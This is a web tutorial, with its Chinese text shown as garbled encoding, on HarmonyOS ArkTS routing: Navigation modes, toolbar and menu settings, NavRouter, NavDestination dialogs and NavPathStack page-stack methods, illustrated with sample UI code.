<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7395ff86fbff46428f6a904716b2aa2c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=gS3UCLZQAqzkp9YAeWP0KvbcKd4%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-4">mode è®¾ç½®æ¨¡å¼</h4>
<p>Navigationæ˜¯è·¯ç”±å®¹å™¨ç»„ä»¶ï¼Œä¸€èˆ¬ä½œä¸ºé¦–é¡µçš„æ ¹å®¹å™¨ï¼ŒåŒ…æ‹¬å•æ (Stack)ã€åˆ†æ (Split)å’Œè‡ªé€‚åº”(Auto)ä¸‰ç§æ˜¾ç¤ºæ¨¡å¼.Navigationç»„ä»¶é€‚ç”¨äºæ¨¡å—å†…å’Œè·¨æ¨¡å—çš„è·¯ç”±åˆ‡æ¢ï¼Œä¸€æ¬¡å¼€å‘ï¼Œå¤šç«¯éƒ¨ç½²åœºæ™¯</p>
<p>Navigationç»„ä»¶é€šè¿‡modeå±æ€§è®¾ç½®é¡µé¢çš„æ˜¾ç¤ºæ¨¡å¼ã€‚è‡ªé€‚åº”æ¨¡å¼ä¸‹ï¼Œå½“é¡µé¢å®½åº¦å¤§äºç­‰äºä¸€å®šé˜ˆå€¼( API version 9åŠä»¥å‰ï¼š520vpï¼ŒAPI version 10åŠä»¥åï¼š600vp )æ—¶ï¼ŒNavigationç»„ä»¶é‡‡ç”¨åˆ†æ æ¨¡å¼ï¼Œåä¹‹é‡‡ç”¨å•æ æ¨¡å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/cb19ad267832450e8d6e6b1ff2f759bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=YXgPw0YARFXlraefEdG1B0%2FHRwk%3D" alt="img" loading="lazy"/></p>
<p>å°†modeå±æ€§è®¾ç½®ä¸ºNavigationMode.Stackï¼ŒNavigationç»„ä»¶å³å¯è®¾ç½®ä¸ºå•é¡µé¢æ˜¾ç¤ºæ¨¡å¼ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/38e8d26224fd4b30ae9efd76d6f10294~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=GN5aLdEa%2B%2B3C9Bj0VLqKDASXCTk%3D" alt="img" loading="lazy"/></p>
<p>å°†modeå±æ€§è®¾ç½®ä¸ºNavigationMode.Splitï¼ŒNavigationç»„ä»¶å³å¯è®¾ç½®ä¸ºåˆ†é¡µé¢æ˜¾ç¤ºæ¨¡å¼ã€‚</p>
<h4 data-id="heading-5">toolbarConfiguration åº•å±‚æ ‡é¢˜æ </h4>
<p>.toolbarConfiguration() é‡Œé¢è®¾ç½®çš„æ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é‡Œé¢æ¯ä¸ªå…ƒç´ ToolbarItemç±»å‹ï¼Œæ•°æ®çš„ç»“æ„å¦‚ä¸‹</p>
<pre><code class="hljs language-plain" lang="plain">{
    value: "æˆ‘çš„",
    icon: "https://s1.aigei.com/src/img/png/e7/e79cacc5161a4a6ca589e097f87a2526.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:TLXitIEF_QaGqfeKVbpaGb8_qyQ=",
    action: () =&gt; {

    },
    activeIcon: "",
    status: ToolbarItemStatus.DISABLED,

}
</code></pre>
<p>value å°±æ˜¯æ˜¾ç¤ºçš„æ–‡å­—</p>
<p>icon æ˜¾ç¤ºçš„å›¾æ ‡</p>
<p>action å½“ç‚¹å‡»æ—¶è§¦å‘åšæŸäº›äº‹æƒ…ï¼Œä¾‹å¦‚è·³è½¬è·¯ç”±</p>
<p>activeIcon æ¿€æ´»æ—¶çš„å›¾æ ‡</p>
<p>status å½“å‰å›¾æ ‡çš„çŠ¶æ€ï¼Œä¾‹å¦‚ä¸å¯ç”¨ç­‰ç­‰</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a26629542d1641dfa26ca2ee3e91a355~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=0V6b2n%2BoTjN%2Bhk8h4cQ%2FB%2F8BVW4%3D" alt="img" loading="lazy"/></p>
<h4 data-id="heading-6">menus èœå•æ </h4>
<p>èœå•æ ä½äºNavigationç»„ä»¶çš„å³ä¸Šè§’ï¼Œå¼€å‘è€…å¯ä»¥é€šè¿‡menuså±æ€§è¿›è¡Œè®¾ç½®ã€‚menusæ”¯æŒArrayå’ŒCustomBuilderä¸¤ç§å‚æ•°ç±»å‹ã€‚ä½¿ç”¨Arrayç±»å‹æ—¶ï¼Œç«–å±æœ€å¤šæ”¯æŒæ˜¾ç¤º3ä¸ªå›¾æ ‡ï¼Œæ¨ªå±æœ€å¤šæ”¯æŒæ˜¾ç¤º5ä¸ªå›¾æ ‡ï¼Œå¤šä½™çš„å›¾æ ‡ä¼šè¢«æ”¾å…¥è‡ªåŠ¨ç”Ÿæˆçš„æ›´å¤šå›¾æ ‡ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/aa20fea36cb44b7cb3f1310741671bd2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=gDkqLMN4TqMkazO2RdP0BWRuAzQ%3D" alt="img" loading="lazy"/></p>
<pre><code class="hljs language-plain" lang="plain">{
    value: "æˆ‘çš„",
    icon: "https://s1.aigei.com/src/img/png/e7/e79cacc5161a4a6ca589e097f87a2526.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:TLXitIEF_QaGqfeKVbpaGb8_qyQ=",
    action: () =&gt; {

    },
   isEnabled:false

}
</code></pre>
<p>value å°±æ˜¯æ˜¾ç¤ºçš„æ–‡å­—</p>
<p>icon æ˜¾ç¤ºçš„å›¾æ ‡</p>
<p>action å½“ç‚¹å‡»æ—¶è§¦å‘åšæŸäº›äº‹æƒ…ï¼Œä¾‹å¦‚è·³è½¬è·¯ç”±</p>
<p>isEnabled æ˜¯å¦å¯ç”¨</p>
<ul>
<li>ç¤ºä¾‹ä»£ç ï¼ˆå…¨éƒ¨ï¼‰</li>
</ul>
<pre><code class="hljs language-arkts" lang="arkts">@Entry
@Component
struct Index {
  build() {
    Navigation() {

    }
    .title("ä¸»æ ‡é¢˜")
      .mode(NavigationMode.Stack)
      .titleMode(NavigationTitleMode.Free)
      .toolbarConfiguration([
        {
          value: "æˆ‘çš„",
          icon: "https://s1.aigei.com/src/img/png/e7/e79cacc5161a4a6ca589e097f87a2526.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:TLXitIEF_QaGqfeKVbpaGb8_qyQ=",
          action: () =&gt; {

          },

        },
        {
          value: "è´­ç‰©è½¦",
          icon: "https://s1.aigei.com/src/img/png/5d/5dc2f07ba8224cd4883648c9ea939ac5.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:Q5dD_6ZS_ry4kaVXHgv6gnKw2IQ=",
          action: () =&gt; {

          }
        },
        {
          value: "æ›´å¤š",
          icon: "https://s1.aigei.com/src/img/png/03/03d71ede7b404e70838f3d575b31a930.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:ABookBJ6PVBeSxtM2hEuQHPlGLE=",
          action: () =&gt; {

          }
        }
      ])
      .menus([
        {
          value: "è®¾ç½®",
          icon: "https://s1.4sai.com/src/img/png/6c/6ca77e26c31548e680b784ab33f72900.png?e=1735488000&amp;token=1srnZGLKZ0Aqlz6dk7yF4SkiYf4eP-YrEOdM1sob:9x9bgI9kDs15UsWPzGN7ZuaICXM=",
          action: () =&gt; {

          },
        },
        {
          value: "å°çº¢ä¹¦",
          icon: "https://s1.aigei.com/src/img/png/3e/3e3bda0ac48046b08e560e8764942bd8.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:JPuRl9bkD4UfIc8fGN4ApLuS_rE=",
          action: () =&gt; {

          }
        },
        {
          value: "å¾®ä¿¡",
          icon: "https://s1.aigei.com/src/img/png/ef/efd714270fdd44f485156053901ecb51.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:GfcdaqAj6Uie-yCw4Wt1pPqAGwg=",
          action: () =&gt; {

          }
        },
        {
          value: "æŠ–éŸ³",
          icon: "https://s1.aigei.com/src/img/png/5b/5b26e982f0b34c47817d3b40c9bf2d1f.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:YCO6IvUtFIqf6x1hmy82VctIElo=",
          action: () =&gt; {

          }
        }
      ])
  }
}
</code></pre>
<h3 data-id="heading-7">2.2 NavRouter</h3>
<p>å¯¼èˆªç»„ä»¶ï¼Œé»˜è®¤æä¾›ç‚¹å‡»å“åº”å¤„ç†ï¼Œä¸éœ€è¦å¼€å‘è€…è‡ªå®šä¹‰ç‚¹å‡»äº‹ä»¶é€»è¾‘ã€‚</p>
<p>å¿…é¡»åŒ…å«ä¸¤ä¸ªå­ç»„ä»¶ï¼Œå…¶ä¸­ç¬¬äºŒä¸ªå­ç»„ä»¶å¿…é¡»ä¸ºNavDestinationã€‚</p>
<p>å…¶ä¸­ç¬¬ä¸€ä¸ªç»„ä»¶æ˜¯éœ€è¦ç‚¹å‡»çš„å…ƒç´ </p>
<p>ç¬¬äºŒä¸ªå¿…é¡»æ˜¯NavDestination</p>
<pre><code class="hljs language-plain" lang="plain">@Entry
@Component
struct Index {
  build() {
    Navigation() {

      // NavRouter() {
      //   Text('èœå•1')
      //   NavDestination() {
      //     Text('å†…å®¹1')
      //   }
      // }
      //
      //
      // NavRouter() {
      //   Text('èœå•2')
      //   NavDestination() {
      //     Text('å†…å®¹2')
      //   }
      // }

      ForEach('123'.split(''), (item: number) =&gt; {
        NavRouter() {
          // è¿™é‡Œæ˜¯ç‚¹å‡»çš„å†…å®¹
          Column() {
            Text("æ–‡æœ¬" + item)
              .width("85%")
              .height(60)
              .backgroundColor("#ccc")
              .borderRadius(25)
              .margin({ top: 10 })
              .textAlign(TextAlign.Center)
          }
          // è¿™é‡Œæ˜¯è·³è½¬æ˜¾ç¤ºçš„é¡µé¢
          NavDestination() {
            Text("æ–‡æœ¬" + item).fontSize(30).fontColor("red")
          }.title("æ ‡é¢˜" + item).hideTitleBar(false)
        }.mode(NavRouteMode.PUSH)
      })


    }.mode(NavigationMode.Split)
  }
}
</code></pre>
<p>è¿™é‡Œæœ‰ä¸€ä¸ªå±æ€§</p>
<h4 data-id="heading-8">mode(mode: NavRouteMode)</h4>
<p>è®¾ç½®æŒ‡å®šç‚¹å‡»NavRouterè·³è½¬åˆ°NavDestinationé¡µé¢æ—¶ï¼Œä½¿ç”¨çš„è·¯ç”±æ¨¡å¼</p>
<p>PUSH_WITH_RECREATE è·³è½¬åˆ°æ–°çš„NavDestinationé¡µé¢æ—¶ï¼Œæ›¿æ¢å½“å‰æ˜¾ç¤ºçš„NavDestinationé¡µé¢ï¼Œé¡µé¢é”€æ¯ï¼Œä½†è¯¥é¡µé¢ä¿¡æ¯ä»ä¿ç•™åœ¨è·¯ç”±æ ˆä¸­ã€‚</p>
<p>PUSH è·³è½¬åˆ°æ–°çš„NavDestinationé¡µé¢æ—¶ï¼Œè¦†ç›–å½“å‰æ˜¾ç¤ºçš„NavDestinationé¡µé¢ï¼Œè¯¥é¡µé¢ä¸é”€æ¯ï¼Œä¸”é¡µé¢ä¿¡æ¯ä¿ç•™åœ¨è·¯ç”±æ ˆä¸­ã€‚</p>
<p>REPLACE è·³è½¬åˆ°æ–°çš„NavDestinationé¡µé¢æ—¶ï¼Œæ›¿æ¢å½“å‰æ˜¾ç¤ºçš„NavDestinationé¡µé¢ï¼Œé¡µé¢é”€æ¯ï¼Œä¸”è¯¥é¡µé¢ä¿¡æ¯ä»è·¯ç”±æ ˆä¸­æ¸…é™¤ã€‚</p>
<p>è¿˜æœ‰ä¸€ä¸ªäº‹ä»¶</p>
<h4 data-id="heading-9">onStateChange(callback: (isActivated: boolean) =&gt; void)</h4>
<p>ç»„ä»¶æ¿€æ´»çŠ¶æ€åˆ‡æ¢æ—¶è§¦å‘è¯¥å›è°ƒã€‚å¼€å‘è€…ç‚¹å‡»æ¿€æ´»NavRouterï¼ŒåŠ è½½å¯¹åº”çš„NavDestinationå­ç»„ä»¶æ—¶ï¼Œå›è°ƒonStateChange(true)ã€‚NavRouterå¯¹åº”çš„NavDestinationå­ç»„ä»¶ä¸å†æ˜¾ç¤ºæ—¶ï¼Œå›è°ƒonStateChange(false)ã€‚</p>
<p>æœ€åæ•ˆæœ</p>
<pre><code class="hljs language-plain" lang="plain">@Entry
  @Component
  struct Index {
    pageStack: NavPathStack = new NavPathStack();
    @State list: Array&lt;number&gt; = [1, 2, 3]

    build() {
      Navigation(this.pageStack) {
        ForEach(this.list, (item: number) =&gt; {
          NavRouter() {
            Column() {
              Text("æ–‡æœ¬" + item)
                .width("85%")
                .height(60)
                .backgroundColor("#ccc")
                .borderRadius(25)
                .margin({ top: 10 })
                .textAlign(TextAlign.Center)
            }

            NavDestination() {
              Text("æ–‡æœ¬" + item)
                .fontSize(30)
                .fontColor("red")
            }.title("æ ‡é¢˜" + item)

          }.mode(NavRouteMode.PUSH)
                .onStateChange((isActivated: boolean) =&gt; {
                   console.log(item + "æ¿€æ´»ï¼š" + isActivated)
          })
        })
      }
      .title("ä¸»æ ‡é¢˜")
        .mode(NavigationMode.Stack)
        .titleMode(NavigationTitleMode.Free)
        .toolbarConfiguration([
          {
            value: "æˆ‘çš„",
            icon: "https://s1.aigei.com/src/img/png/e7/e79cacc5161a4a6ca589e097f87a2526.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:TLXitIEF_QaGqfeKVbpaGb8_qyQ=",
            action: () =&gt; {
              this.pageStack.pushPath({ name: "pageOne", param: "aaa" })
            },

          },
          {
            value: "è´­ç‰©è½¦",
            icon: "https://s1.aigei.com/src/img/png/5d/5dc2f07ba8224cd4883648c9ea939ac5.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:Q5dD_6ZS_ry4kaVXHgv6gnKw2IQ=",
            action: () =&gt; {

            }
          },
          {
            value: "æ›´å¤š",
            icon: "https://s1.aigei.com/src/img/png/03/03d71ede7b404e70838f3d575b31a930.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:ABookBJ6PVBeSxtM2hEuQHPlGLE=",
            action: () =&gt; {

            }
          }
        ])
        .menus([
          {
            value: "è®¾ç½®",
            icon: "https://s1.4sai.com/src/img/png/6c/6ca77e26c31548e680b784ab33f72900.png?e=1735488000&amp;token=1srnZGLKZ0Aqlz6dk7yF4SkiYf4eP-YrEOdM1sob:9x9bgI9kDs15UsWPzGN7ZuaICXM=",
            action: () =&gt; {

            },
          },
          {
            value: "å°çº¢ä¹¦",
            icon: "https://s1.aigei.com/src/img/png/3e/3e3bda0ac48046b08e560e8764942bd8.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:JPuRl9bkD4UfIc8fGN4ApLuS_rE=",
            action: () =&gt; {

            }
          },
          {
            value: "å¾®ä¿¡",
            icon: "https://s1.aigei.com/src/img/png/ef/efd714270fdd44f485156053901ecb51.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:GfcdaqAj6Uie-yCw4Wt1pPqAGwg=",
        action: () =&gt; {

        }
      },
      {
        value: "æŠ–éŸ³",
        icon: "https://s1.aigei.com/src/img/png/5b/5b26e982f0b34c47817d3b40c9bf2d1f.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:YCO6IvUtFIqf6x1hmy82VctIElo=",
        action: () =&gt; {

        }
      }
    ])
  }
}
</code></pre>
<h3 data-id="heading-10">2.3  ç‹¬ç«‹çš„NavDestination</h3>
<p>åˆ‡è®°ç‹¬ç«‹çš„NavDestinationä¸èƒ½é€šè¿‡NavRouterè·³è½¬ å®ƒä¹Ÿè¢«å¼ƒç”¨äº†ï¼Œåªèƒ½é€šè¿‡ NavPathStackåˆ›å»ºä¸€ä¸ªè·¯ç”±æ ˆå¯¹è±¡ï¼Œ</p>
<p>ç„¶åé€šè¿‡è·¯ç”±æ ˆå¯¹è±¡æ§åˆ¶é¡µé¢è·³è½¬</p>
<h4 data-id="heading-11">å…·ä½“å®ç°</h4>
<p>1ã€Profile.ets æŠŠé¡µé¢å†…å®¹NavDestinationç‹¬ç«‹å‡ºå»</p>
<pre><code class="hljs language-plain" lang="plain">@Component
export struct Profile {
  build() {
    NavDestination() { // æ ¹å…ƒç´ å¿…é¡»æ˜¯NavDestination
      Column() {
        Text("å®é™…çš„å†…å®¹")
      }
    }
    .title("æ ‡é¢˜")
  }
}
</code></pre>
<p>2ã€Navigationé€šè¿‡å±æ€§å…³è”Profileé¡µé¢</p>
<pre><code class="hljs language-plain" lang="plain">import {Profile} from './Profile'

@Entry
@Component
export struct Index {

  @Builder PagesMap(name: string) {
    if (name === "Profile") {
      Profile()
    }
  }

  pageStack: NavPathStack = new NavPathStack()  // é¡µé¢æ ˆå¯¹è±¡ ç®¡ç†é¡µé¢æ ˆé‡Œé¢çš„ç½‘é¡µ

  build() {
    Navigation(this.pageStack) {
      Button('è·³è½¬åˆ°Carté¡µé¢').onClick(() =&gt; {
        this.pageStack.pushPathByName('Profile', null)
        // this.pageStack.pushPath({ name: "Profile", param: "å®é™…éœ€è¦æ˜¾ç¤ºçš„å†…å®¹" })
      })
    }
    .title("ä¸»æ ‡é¢˜")
    .mode(NavigationMode.Stack)
    .navDestination(this.PagesMap) // é€šè¿‡å±æ€§çš„æ–¹å¼åŠ¨æ€è®¾ç½®
  }
}
</code></pre>
<p>3ã€æ§åˆ¶è·³è½¬ï¼ˆä¹‹å‰æ²¡æœ‰ç‹¬ç«‹NavRouter ç‹¬ç«‹ä¹‹åå¿…é¡»é€šè¿‡Navigationæä¾›çš„<strong>é¡µé¢æ ˆå¯¹è±¡</strong>æ¥æ“ä½œ</p>
<pre><code class="hljs language-plain" lang="plain">3.1 åˆ›å»ºé¡µé¢æ ˆ

pageStack: NavPathStack = new NavPathStack(); // åˆ›å»ºé¡µé¢æ ˆå®ä¾‹åŒ–å¯¹è±¡  æ§åˆ¶é¡µé¢æ ˆè·¯ç”±å¢åˆ æ”¹ç­‰
 
3.2 æ³¨å†Œå…³è”
Navigation(this.pageStack) {

3.3  è·³è½¬
https://developer.huawei.com/consumer/cn/doc/harmonyos-guides-V5/arkts-navigation-navigation-V5#%E8%B7%AF%E7%94%B1%E6%93%8D%E4%BD%9C
</code></pre>
<h4 data-id="heading-12">NavDestinationçš„æ¨¡å¼</h4>
<p>NavDestinationçš„modeå±æ€§æœ‰ä¸¤ç§å€¼</p>
<p>æ ‡å‡†ç±»å‹ NavDestinationMode.STANDARD</p>
<p>æ ‡å‡†ç±»å‹çš„NavDestinationçš„ç”Ÿå‘½å‘¨æœŸè·Ÿéšå…¶åœ¨NavPathStacké¡µé¢æ ˆä¸­çš„ä½ç½®å˜åŒ–è€Œæ”¹å˜ã€‚</p>
<p>å¼¹çª—ç±»å‹ NavDestinationMode.DIALOG</p>
<p>æ•´ä¸ªNavDestinationé»˜è®¤é€æ˜æ˜¾ç¤ºã€‚å¼¹çª—ç±»å‹çš„NavDestinationæ˜¾ç¤ºå’Œæ¶ˆå¤±æ—¶ä¸ä¼šå½±å“ä¸‹å±‚æ ‡å‡†ç±»å‹çš„NavDestinationçš„æ˜¾ç¤ºå’Œç”Ÿå‘½å‘¨æœŸï¼Œä¸¤è€…å¯ä»¥åŒæ—¶æ˜¾ç¤ºã€‚</p>
<p>ä¸‹é¢å¤„ç†ä¸€ä¸ªå¼¹çª—é—®é¢˜</p>
<pre><code class="hljs language-plain" lang="plain">@Component
export  struct DialogPage {
  @Consume pageStack: NavPathStack;
  param: string = ""

  build() {
    NavDestination() {
      Column() {
        Stack({ alignContent: Alignment.TopEnd }) {
          Text(this.param)
            .fontSize(30)
            .fontColor("red")
            .textAlign(TextAlign.Center)
            .width("100%")
            .margin({ top: 80 })
          Button("Ã—").onClick(() =&gt; {
            this.pageStack.pop();
          })
        }.width("70%")
          .height("30%")
          .backgroundColor("white")
          .borderRadius(30)
      }.justifyContent(FlexAlign.Center)
        .alignItems(HorizontalAlign.Center)
        .width("100%")
        .height("100%")
    }
    .backgroundColor("rgba(0,0,0,0.5)")
      .mode(NavDestinationMode.DIALOG)
      .title("æ ‡é¢˜")
      .hideTitleBar(true)
  }
}
import { DialogPage } from '../components/DialogPage';


@Entry
  @Component
  struct Index {
    @Provide pageStack: NavPathStack = new NavPathStack();

    @Builder
    PagesMap(name: string, param: string) {
      if (name === "dialogPage") {
        DialogPage({ param: param })
      }
    }

    build() {
      Navigation(this.pageStack) {

      }
      .title("ä¸»æ ‡é¢˜")
        .mode(NavigationMode.Stack)
        .titleMode(NavigationTitleMode.Free)
        .navDestination(this.PagesMap)
        .toolbarConfiguration([
          {
            value: "æˆ‘çš„",
            icon: "https://s1.aigei.com/src/img/png/e7/e79cacc5161a4a6ca589e097f87a2526.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:TLXitIEF_QaGqfeKVbpaGb8_qyQ=",
            action: () =&gt; {
              this.pageStack.pushPath({ name: "dialogPage", param: "aaa" })
            },

          },
          {
            value: "è´­ç‰©è½¦",
            icon: "https://s1.aigei.com/src/img/png/5d/5dc2f07ba8224cd4883648c9ea939ac5.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:Q5dD_6ZS_ry4kaVXHgv6gnKw2IQ=",
            action: () =&gt; {

            }
          },
          {
            value: "æ›´å¤š",
            icon: "https://s1.aigei.com/src/img/png/03/03d71ede7b404e70838f3d575b31a930.png?imageMogr2/auto-orient/thumbnail/!282x282r/gravity/Center/crop/282x282/quality/85/%7CimageView2/2/w/282&amp;e=1735488000&amp;token=P7S2Xpzfz11vAkASLTkfHN7Fw-oOZBecqeJaxypL:ABookBJ6PVBeSxtM2hEuQHPlGLE=",
            action: () =&gt; {

            }
          }
        ])
    }
  }
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0b9a79a603714bab968b1c4b20460ccf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgSVTlhYXnlLXnq5k=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764825766&amp;x-signature=IaczK3cVsvnc6Wbm3XOYfVLxB7c%3D" alt="img" loading="lazy"/></p>
<h3 data-id="heading-13">2.4 NavPathStack</h3>
<p>NavPathStrackæ˜¯<strong>é¡µé¢æ ˆ</strong>ä¸ºè·¯ç”±è·³è½¬æä¾›çš„æ–¹æ³•å¯¹è±¡ï¼Œæ¯ä¸ªNavigationéƒ½éœ€è¦åˆ›å»ºå¹¶ä¼ å…¥ä¸€ä¸ªNavPathStackå¯¹è±¡ï¼Œç”¨äºç®¡ç†é¡µé¢ã€‚ä¸»è¦æ¶‰åŠé¡µé¢è·³è½¬ã€é¡µé¢è¿”å›ã€é¡µé¢æ›¿æ¢ã€é¡µé¢åˆ é™¤ã€å‚æ•°è·å–ã€è·¯ç”±æ‹¦æˆªç­‰åŠŸèƒ½ã€‚</p>
<p>pageStack: NavPathStack = new NavPathStack()</p>
<h4 data-id="heading-14">æ™®é€šè·³è½¬</h4>
<pre><code class="hljs language-plain" lang="plain">this.pageStack.pushPath({ name: "DialogPage", param: "aaa" })
this.pageStack.pushPathByName("DialogPage", "aaa")
</code></pre>
<p>è¿™ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ä½¿ç”¨</p>
<h4 data-id="heading-15">å¸¦è¿”å›å›è°ƒçš„è·³è½¬ï¼Œè·³è½¬æ—¶æ·»åŠ onPopå›è°ƒ,èƒ½åœ¨é¡µé¢å‡ºæ ˆæ—¶è·å–è¿”å›ä¿¡æ¯</h4>
<pre><code class="hljs language-plain" lang="plain">this.pageStack.pushPath({
  name: "DialogPage", param: "aaa", onPop: (popInfo) =&gt; {
    Logger.log(popInfo.result)
  }
})
</code></pre>
<p>å…³é—­é€€å›æ—¶é€šè¿‡popä¼ å›çš„æ•°æ®</p>
<pre><code class="hljs language-plain" lang="plain">Button("Ã—").onClick(() =&gt; {
  this.pageStack.pop("è¿”å›çš„å†…å®¹")
})
</code></pre>
<h4 data-id="heading-16">é¡µé¢è¿”å›</h4>
<pre><code class="hljs language-plain" lang="plain">// è¿”å›åˆ°ä¸Šä¸€é¡µ
this.pageStack.pop()
// è¿”å›åˆ°ä¸Šä¸€ä¸ªPageOneé¡µé¢
this.pageStack.popToName("PageOne")
// è¿”å›åˆ°ç´¢å¼•ä¸º1çš„é¡µé¢
this.pageStack.popToIndex(1)
// è¿”å›åˆ°æ ¹é¦–é¡µï¼ˆæ¸…é™¤æ ˆä¸­æ‰€æœ‰é¡µé¢ï¼‰
this.pageStack.clear()
</code></pre>
<h4 data-id="heading-17">é¡µé¢æ›¿æ¢</h4>
<pre><code class="hljs language-plain" lang="plain">// å°†æ ˆé¡¶é¡µé¢æ›¿æ¢ä¸ºPageOne
this.pageStack.replacePath({ name: "PageOne", param: "PageOne Param" })
this.pageStack.replacePathByName("PageOne", "PageOne Param")
</code></pre>
<h4 data-id="heading-18">é¡µé¢åˆ é™¤</h4>
<pre><code class="hljs language-plain" lang="plain">// åˆ é™¤æ ˆä¸­nameä¸ºPageOneçš„æ‰€æœ‰é¡µé¢
this.pageStack.removeByName("PageOne")
// åˆ é™¤æŒ‡å®šç´¢å¼•çš„é¡µé¢
this.pageStack.removeByIndexes([1,3,5])
</code></pre>
<h4 data-id="heading-19">å‚æ•°è·å–</h4>
<pre><code class="hljs language-plain" lang="plain">// è·å–æ ˆä¸­æ‰€æœ‰é¡µé¢nameé›†åˆ
this.pageStack.getAllPathName()
// è·å–ç´¢å¼•ä¸º1çš„é¡µé¢å‚æ•°
this.pageStack.getParamByIndex(1)
// è·å–PageOneé¡µé¢çš„å‚æ•°
this.pageStack.getParamByName("PageOne")
// è·å–PageOneé¡µé¢çš„ç´¢å¼•é›†åˆ
this.pageStack.getIndexByName("PageOne")
</code></pre>
<h4 data-id="heading-20">è·¯ç”±æ‹¦æˆª</h4>
<p>åœ¨é¡µé¢çš„åˆå§‹ç”Ÿå‘½å‘¨æœŸä¸­è®¾ç½®</p>
<pre><code class="hljs language-plain" lang="plain">aboutToAppear(): void {
  this.pageStack.setInterception({
